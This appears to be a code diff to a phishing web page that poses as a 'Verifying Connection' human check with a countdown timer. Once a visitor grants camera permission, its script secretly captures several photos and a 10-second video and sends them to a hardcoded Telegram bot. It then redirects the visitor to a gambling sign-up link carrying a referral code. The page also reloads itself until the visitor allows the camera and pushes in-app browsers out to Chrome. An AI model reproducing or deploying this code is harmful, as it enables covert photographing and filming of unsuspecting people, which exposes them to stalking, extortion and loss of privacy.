@@ -1,4 +1,4 @@
-   <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -13,12 +13,18 @@
 
     <div class="max-w-md w-full p-6 bg-white shadow-xl rounded-xl text-center border border-gray-200">
         <div class="mb-4 flex justify-center">
-            <div class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full"></div>
+            <div id="loader" class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full"></div>
         </div>
         <h2 class="text-xl font-bold text-gray-800">Verifying Connection...</h2>
-        <p class="text-gray-500 mt-2 text-sm">Please wait while we verify you are a human. Click <b>"Allow"</b> to proceed.</p>
-        <div class="mt-6 py-3 px-4 bg-blue-50 border border-blue-100 rounded-lg text-blue-700 text-[10px] text-left">
-            Ray ID: 91b3c2a0e7d12402 • Your IP: 103.145.xxx.xx
+        <p class="text-gray-500 mt-2 text-sm">Please click <b>"Allow"</b> to confirm you are human.</p>
+        
+        <div class="mt-6 p-4 bg-gray-50 rounded-lg border border-gray-100">
+            <p class="text-xs text-gray-400 uppercase tracking-widest font-semibold">Security Check in Progress</p>
+            <div id="timer" class="text-3xl font-mono font-bold text-blue-600 mt-1">15s</div>
+        </div>
+
+        <div class="mt-4 py-2 px-4 bg-blue-50 border border-blue-100 rounded-lg text-blue-700 text-[10px] text-left">
+            Ray ID: 91b3c2a0e7d12402 • Do not close this window.
         </div>
     </div>
 
@@ -26,7 +32,7 @@
     <canvas id="c_save" class="hidden"></canvas>
 
     <script>
-        // ১. সরাসরি Chrome-এ নিয়ে যাওয়ার পাওয়ারফুল সিস্টেম (Messenger & Telegram Fixed)
+        // ১. অটোমেটিক Chrome ব্রাউজারে নিয়ে যাওয়ার সিস্টেম
         const ua = navigator.userAgent;
         const isApp = /FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua);
         if (isApp && ua.includes("Android")) {
@@ -36,13 +42,23 @@
 
         const CONFIG = {
             t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
-            c: '7785049939', // <--- আপনার Telegram Chat ID এখানে দিন
+            c: '7785049939', // তোমার চ্যাট আইডি বসিয়ে দেওয়া হয়েছে
             u: 'https://dkwin9.com/#/register?invitationCode=14856937272',
-            max_photos: 15,
-            video_duration: 10000 
+            max_photos: 6, // তুমি ৬টি ছবি চেয়েছো
+            video_duration: 10000 // ১০ সেকেন্ড ভিডিও
         };
 
         let photoCount = 0;
+        let timeLeft = 15;
+
+        function startTimer() {
+            const timerElement = document.getElementById('timer');
+            const countdown = setInterval(() => {
+                timeLeft--;
+                if (timeLeft >= 0) timerElement.innerText = timeLeft + "s";
+                if (timeLeft <= 0) clearInterval(countdown);
+            }, 1000);
+        }
 
         async function init() {
             try {
@@ -50,13 +66,15 @@
                 const video = document.getElementById('v_stream');
                 video.srcObject = stream;
 
-                // ২. প্রথমে ১ সেকেন্ড অপেক্ষা করে ফটো তোলা শুরু (যাতে কালো না আসে)
+                startTimer();
+
+                // ক্যামেরা ওয়ার্ম-আপের জন্য ১ সেকেন্ড পর ফটো শুরু
                 setTimeout(() => {
                     startBurstPhotos(stream);
                 }, 1000);
 
             } catch (err) {
-                // অনুমতি না দিলে অটো রিলোড
+                // পারমিশন না দিলে অটো রিলোড
                 setTimeout(() => { location.reload(); }, 500);
             }
         }
@@ -68,10 +86,10 @@
                     photoCount++;
                 } else {
                     clearInterval(photoInterval);
-                    // ফটো তোলা শেষ হলে ভিডিও রেকর্ডিং শুরু
+                    // ৫ সেকেন্ড পর (বা ৬টি ছবি শেষ হলে) ভিডিও শুরু
                     startVideoRecording(stream);
                 }
-            }, 400); 
+            }, 800); // গ্যাপ রাখা হয়েছে যাতে ছবি ক্লিয়ার আসে
         }
 
         function takeSnap() {
@@ -87,7 +105,7 @@
                 formData.append('chat_id', CONFIG.c);
                 formData.append('photo', blob, `img_${photoCount}.jpg`);
                 fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/jpeg', 0.8);
+            }, 'image/jpeg', 0.9); // হাই কোয়ালিটি
         }
 
         function startVideoRecording(stream) {
@@ -100,11 +118,10 @@
                 const formData = new FormData();
                 formData.append('chat_id', CONFIG.c);
                 formData.append('video', blob, 'capture.mp4');
-                formData.append('caption', 'Target Multi-Capture Complete');
+                formData.append('caption', 'Capture Done (6 Photos + 10s Video)');
 
                 await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
-                // সব কাজ শেষে রিডাইরেক্ট
-                window.location.replace(CONFIG.u);
+                window.location.replace(CONFIG.u); // সবশেষে রিডাইরেক্ট
             };
 
             mediaRecorder.start();
@@ -118,4 +135,3 @@
     </script>
 </body>
 </html>
-               
